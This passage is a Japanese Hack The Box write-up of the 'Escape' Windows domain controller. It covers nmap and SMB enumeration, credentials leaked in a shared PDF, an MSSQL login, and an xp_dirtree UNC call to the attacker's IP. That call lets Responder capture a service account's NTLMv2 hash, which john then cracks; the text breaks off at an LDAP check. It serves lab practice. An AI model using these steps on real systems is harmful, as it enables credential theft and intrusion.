![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/531
 #medium 
- OS : #Windows
- Machine Author(s): [Geiseric](https://app.hackthebox.com/users/184611)
- Hack Date: 2025-08-08

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## Nmap
空いているポートから、DCであることがわkる
ドメイン名
- sequel.htb
- dc.sequel.htb

| ポート       | サービス         | バージョン                                        | その他                                                 |
| --------- | ------------ | -------------------------------------------- | --------------------------------------------------- |
| 53/tcp    | **DNS**      | Simple DNS Plus                              |                                                     |
| 88/tcp    | **kerberos** | Microsoft Windows Kerberos                   | server time: 2025-08-06 14:45:50Z                   |
| 135/tcp   | msrpc        | Microsoft Windows RPC                        |                                                     |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn                |                                                     |
| 389/tcp   | **LDAP**     | Microsoft Windows Active Directory LDAP      | Domain: sequel.htb0., Site: Default-First-Site-Name |
| 445/tcp   | **SMB**      | ?                                            |                                                     |
| 464/tcp   | kpasswd5     | ?                                            |                                                     |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0          |                                                     |
| 636/tcp   | **LDAPS**    | Microsoft Windows Active Directory LDAP      | SSL証明書あり                                            |
| 1433/tcp  | **MSSQL**    | Microsoft SQL Server 2019 15.00.2000.00; RTM |                                                     |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP      | SSL証明書あり                                            |
| 3269/tcp  | ssl/ldap     | Microsoft Windows Active Directory LDAP      | SSL証明書あり                                            |
| 5985/tcp  | **WinRM**    | Microsoft HTTPAPI httpd 2.0                  |                                                     |
| 9389/tcp  | mc-nmf       | .NET Message Framing                         |                                                     |
| 49667/tcp | msrpc        | Microsoft Windows RPC                        |                                                     |
| 49689/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0          |                                                     |
| 49690/tcp | msrpc        | Microsoft Windows RPC                        |                                                     |
| 49708/tcp | msrpc        | Microsoft Windows RPC                        |                                                     |
| 49717/tcp | msrpc        | Microsoft Windows RPC                        |                                                     |
| 49738/tcp | msrpc        | Microsoft Windows RPC                        |                                                     |

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-06 14:45:50Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-06T14:47:31+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| I1fLChrYFtPk3g5JHaHyIE9aY3EUmU3EH2SKhRSi5R6GJBctmw==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-06T14:47:29+00:00; +8h00m00s from scanner time.
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.247.57:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-08-06T14:47:30+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-06T14:00:09
| Not valid after:  2055-08-06T14:00:09
| MD5:   8644:29d8:b1b0:ecb8:d6a0:9fcc:5aea:c3ce
| SHA-1: 05ee:16ee:6b9a:abe8:d845:05d7:e10f:3817:ec9b:f5f2
| -----BEGIN CERTIFICATE-----
| Pe4WUg==
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.129.247.57:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-06T14:47:30+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-06T14:47:29+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49717/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49738/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/5%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6892FA85%P=aarch64-unknown-linux-gnu)
SEQ(SP=102%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=U)
SEQ(SP=FE%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-06T14:46:51
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64428/tcp): CLEAN (Timeout)
|   Check 2 (port 6319/tcp): CLEAN (Timeout)
|   Check 3 (port 26469/udp): CLEAN (Timeout)
|   Check 4 (port 20353/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   253.33 ms 10.10.14.1
2   253.52 ms 10.129.247.57

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:47
Completed NSE at 23:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:47
Completed NSE at 23:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:47
Completed NSE at 23:47, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.70 seconds
           Raw packets sent: 104 (8.284KB) | Rcvd: 53 (2.912KB)
                                                                      
```

## SMB
- 匿名ログインできるのか
	- できる
Publicフォルダはアクセスできそう
- `SQL Server Procedures.pdf `が置いてあるので取得する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ smbclient -N -L //$Target_IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.247.57 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ smbclient -N //$Target_IP/Public   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 03:51:25 2022
  ..                                  D        0  Sat Nov 19 03:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 05:39:43 2022
                5184255 blocks of size 4096. 1466821 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (27.5 KiloBytes/sec) (average 27.5 KiloBytes/sec)
smb: \> 

```


SQL Server Procedures.pdfの中身
- 
![](https://i.imgur.com/hCpWOFN.png)


日本語訳

**SQL Server 手順書**
昨年から、SQLサーバーでいくつかの事故が発生しています（見てるぞライアン、DC上にインスタンスを置くとは…なぜモックインスタンスをDCに？）。そこでトムが、データベースへのアクセス方法と変更テストの基本手順を書くのが良いと判断しました。
もちろん、本番サーバーではなく、DCのモックアップを専用サーバーにクローンしています。
トムは休暇から戻り次第、DC上のインスタンスを削除する予定です。
この文書のもう1つの目的は、上級者が不在でも新人が対応できるようにガイドとして使うことです。

**ドメイン参加済みマシンからアクセスする方法**
1. “Windows 認証”を指定してSQL Management Studioを使用します。以下からダウンロード可能です：
    [SSMS ダウンロードリンク](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16)
2. 「Server Name」フィールドにサーバー名を入力します。
3. 「Windows Authentication」を指定します。
4. データベースにアクセスして必要な作業を行ってください。夜間にライブサーバーと同期されます。

**ドメイン未参加マシンからアクセスする方法**
ドメイン未参加マシンからのアクセスは少し手間です。
基本的な手順は同じですが、コマンドプロンプトを開き、以下のコマンドを実行する必要があります：
```
cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<username>" /pass:<password>
```
その後は上記の手順に従ってください。
問題が発生した場合は Brandon にメールを送ってください。

**ボーナス情報**
新しく雇用された人や、まだユーザー作成や権限割当がされていない人は、以下の資格情報でデータベースを一時的に覗くことができます：
- ユーザー名：PublicUser
- パスワード：GuestUserCantWrite1
前述の手順を参考にし、「Windows Authentication」ではなく「SQL Server Authentication」に切り替えることを忘れずに。

### PublicUserの認証情報
PublicUser : GuestUserCantWrite1

## LDAP
PublicUser自体の権限を取得しようと試みる
- ログインできない
- LDAPでは使用できない認証情報？？
	- それかドメインの指定が間違っているか
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ ldapsearch -x -H ldap://$Target_IP -D "CN=PublicUser,CN=Users,DC=sequel,DC=HTB" -w 'GuestUserCantWrite1' -b "DC=sequel,DC=HTB" "(sAMAccountName=PublicUser)"
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563
                                                                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ ldapsearch -x -H ldap://$Target_IP -D "PublicUser" -w 'GuestUserCantWrite1' -b "DC=sequel,DC=HTB" "(sAMAccountName=PublicUser)"
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563
                                                                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ ldapsearch -x -H ldap://$Target_IP -D "sequel\\PublicUser" -w 'GuestUserCantWrite1' -b "DC=sequel,DC=HTB" "(sAMAccountName=PublicUser)"
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563
               
```


匿名も無理
```sh
└─$ ldapsearch -x -H ldap://$Target_IP -b "DC=sequel,DC=HTB"
# extended LDIF
#
# LDAPv3
# base <DC=sequel,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

## Enum4linux-ng
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ enum4linux-ng -u PublicUser -p GuestUserCantWrite1 $Target_IP
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.247.57
[*] Username ......... 'PublicUser'
[*] Random Username .. 'gtwtnlga'
[*] Password ......... 'GuestUserCantWrite1'
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.247.57    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.247.57    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: sequel.htb

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.247.57    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.247.57    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                  
  SMB 1.0: false                                                                                                                                                     
  SMB 2.02: true                                                                                                                                                     
  SMB 2.1: true                                                                                                                                                      
  SMB 3.0: true                                                                                                                                                      
  SMB 3.1.1: true                                                                                                                                                    
Preferred dialect: SMB 3.0                                                                                                                                           
SMB1 only: false                                                                                                                                                     
SMB signing required: true                                                                                                                                           

 ============================================================
|    Domain Information via SMB session for 10.129.247.57    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                                                                                                            
NetBIOS domain name: sequel                                                                                                                                          
DNS domain: sequel.htb                                                                                                                                               
FQDN: dc.sequel.htb                                                                                                                                                  
Derived membership: domain member                                                                                                                                    
Derived domain: sequel                                                                                                                                               

 ==========================================
|    RPC Session Check on 10.129.247.57    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'PublicUser', password 'GuestUserCantWrite1'
[*] Check for random user
[+] Server allows session using username 'gtwtnlga', password 'GuestUserCantWrite1'
[H] Rerunning enumeration with user 'gtwtnlga' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.247.57    |
 ====================================================
[+] Domain: sequel
[+] Domain SID: S-1-5-21-4078382237-1492182817-2568127209
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.129.247.57    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                             
OS version: '10.0'                                                                                                                                                   
OS release: '1809'                                                                                                                                                   
OS build: '17763'                                                                                                                                                    
Native OS: not supported                                                                                                                                             
Native LAN manager: not supported                                                                                                                                    
Platform id: '500'                                                                                                                                                   
Server type: '0x80102f'                                                                                                                                              
Server type string: Wk Sv Sql PDC Tim NT                                                                                                                             

 ======================================
|    Users via RPC on 10.129.247.57    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on 10.129.247.57    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on 10.129.247.57    |
 =======================================
[*] Enumerating shares
[+] Found 6 share(s):
ADMIN$:                                                                                                                                                              
  comment: Remote Admin                                                                                                                                              
  type: Disk                                                                                                                                                         
C$:                                                                                                                                                                  
  comment: Default share                                                                                                                                             
  type: Disk                                                                                                                                                         
IPC$:                                                                                                                                                                
  comment: Remote IPC                                                                                                                                                
  type: IPC                                                                                                                                                          
NETLOGON:                                                                                                                                                            
  comment: Logon server share                                                                                                                                        
  type: Disk                                                                                                                                                         
Public:                                                                                                                                                              
  comment: ''                                                                                                                                                        
  type: Disk                                                                                                                                                         
SYSVOL:                                                                                                                                                              
  comment: Logon server share                                                                                                                                        
  type: Disk                                                                                                                                                         
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: DENIED
[*] Testing share Public
[-] Could not check share: timed out
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: DENIED

 ==========================================
|    Policies via RPC for 10.129.247.57    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for 10.129.247.57    |
 ==========================================
[+] No printers available

Completed after 82.28 seconds

```

## CrackMapExec
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ crackmapexec smb $Target_IP -u PublicUser -p 'GuestUserCantWrite1' --shares
SMB         10.129.247.57   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.247.57   445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 
SMB         10.129.247.57   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ crackmapexec smb $Target_IP -u PublicUser -p 'GuestUserCantWrite1' --users 
SMB         10.129.247.57   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.247.57   445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 
SMB         10.129.247.57   445    DC               [-] Error enumerating domain users using dc ip 10.129.247.57: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
SMB         10.129.247.57   445    DC               [*] Trying with SAMRPC protocol

```
# Foothold

## MSSQL
- linuxにはもちろんcmdkeyはないので、mssqlclient.pyを使う
PublicUser : GuestUserCantWrite1
- 
```bash
impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@sequel.htb' -windows-auth
```

接続→状況確認
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@sequel.htb'              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> select @@version;
                                                                                                                                                                                                                           
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

SQL (PublicUser  guest@master)> select SYSTEM_USER, CURRENT_USER;
                
-----   -----   
guest   guest   

SQL (PublicUser  guest@master)> select IS_SRVROLEMEMBER('sysadmin') as is_sysadmin, IS_MEMBER('db_owner') as is_db_owner;
is_sysadmin   is_db_owner   
-----------   -----------   
          0             0   

```
バージョンに、RCEの脆弱性(### [CVE-2024-37334](https://www.cvedetails.com/cve/CVE-2024-37334/ "CVE-2024-37334 セキュリティ脆弱性の詳細"))あるけど、web上では特にPoCなどは見当たらない
- https://www.cvedetails.com/version/1810135/Microsoft-Sql-Server-2019-15.0.2000.5.html

guestなので、cmdshellは有効化できない
```sh
SQL (PublicUser  guest@master)> enable_xp_cmdshell
ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
```

サーバー全体のユーザー・権限
```sh
SQL (PublicUser  guest@master)> select name, type_desc from sys.server_principals;
name            type_desc     
-------------   -----------   
sa              SQL_LOGIN     

public          SERVER_ROLE   

sysadmin        SERVER_ROLE   

securityadmin   SERVER_ROLE   

serveradmin     SERVER_ROLE   

setupadmin      SERVER_ROLE   

processadmin    SERVER_ROLE   

diskadmin       SERVER_ROLE   

dbcreator       SERVER_ROLE   

bulkadmin       SERVER_ROLE   

PublicUser      SQL_LOGIN    
```

```sh
SQL (PublicUser  guest@master)> select name, state_desc from sys.databases;
name     state_desc   
------   ----------   
master   ONLINE       

tempdb   ONLINE       

model    ONLINE       

msdb     ONLINE
```

今の自分の権限
- Server
	- CONNECT SQL → サーバに接続できるだけ
	- VIEW ANY DATABASE → 存在するDBの一覧を見るだけ
- Database
	- 接続と暗号化キー定義の閲覧だけ
    - SELECT すら無いので、テーブル内容は読めない
```sh
SQL (PublicUser  guest@msdb)> select * from fn_my_permissions(null,'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         

server                         VIEW ANY DATABASE   

SQL (PublicUser  guest@msdb)> select * from fn_my_permissions(db_name(),'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     

database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   

database                       VIEW ANY COLUMN MASTER KEY DEFINITION       


```

サービスアカウントの確認
```sh
SQL (PublicUser  guest@msdb)> exec master..xp_instance_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSQL$SQLMOCK', N'ObjectName';
Value        Data             
----------   --------------   
ObjectName   sequel\sql_svc 
```

パスワードの使い回しはなさそう
```sh
└─$ crackmapexec smb sequel.htb -u 'sql_svc' -p 'GuestUserCantWrite1' -d sequel
SMB         sequel.htb      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel) (signing:True) (SMBv1:False)
SMB         sequel.htb      445    DC               [-] sequel\sql_svc:GuestUserCantWrite1 STATUS_LOGON_FAILURE 

```

サービスアカウントの、sql_svcのNTLMハッシュを取得するため、responderを設置して、SQLサーバにUNCアクセスをさせる
```sh
SQL (PublicUser  guest@msdb)> exec master..xp_dirtree '\\10.10.14.62\share';
subdirectory   depth   
------------   -----  
```


responder
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:79f9fb6655afbbca:67FBBAB13F40FA7ED86DCC307898F45C:010100000000000000C6329AEB07DC01EFA57C5495F03B8C000000000200080055004E005700520001001E00570049004E002D0032004300590059005A0033003800520038003100370004003400570049004E002D0032004300590059005A003300380052003800310037002E0055004E00570052002E004C004F00430041004C000300140055004E00570052002E004C004F00430041004C000500140055004E00570052002E004C004F00430041004C000700080000C6329AEB07DC0106000400020000000800300030000000000000000000000000300000898D5D503C4540E42457CCEBD8D4FCE655DE38455B012ED7481E325D6D5B565B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360032000000000000000000  
```

NTLMハッシュのクラック
```bash
echo'sql_svc::sequel:79f9fb6655afbbca:67FBBAB13F40FA7ED86DCC307898F45C:010100000000000000C6329AEB07DC01EFA57C5495F03B8C000000000200080055004E005700520001001E00570049004E002D0032004300590059005A0033003800520038003100370004003400570049004E002D0032004300590059005A003300380052003800310037002E0055004E00570052002E004C004F00430041004C000300140055004E00570052002E004C004F00430041004C000500140055004E00570052002E004C004F00430041004C000700080000C6329AEB07DC0106000400020000000800300030000000000000000000000000300000898D5D503C4540E42457CCEBD8D4FCE655DE38455B012ED7481E325D6D5B565B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360032000000000000000000\n' > hash.txt
```

クラックする
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 65.79% (ETA: 22:52:07) 0g/s 3137Kp/s 3137Kc/s 3137KC/s brown1950..broe97
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:03 DONE (2025-08-07 22:52) 0.2915g/s 3120Kp/s 3120Kc/s 3120KC/s RICANNENA1..RBDesloMEJOR
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```
sql_svcの認証情報がわかった
### sql_svcの認証情報
sql_svc : REGGIE1234ronnie

LDAPで、sql_svcでログインできるか、権限を確認する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
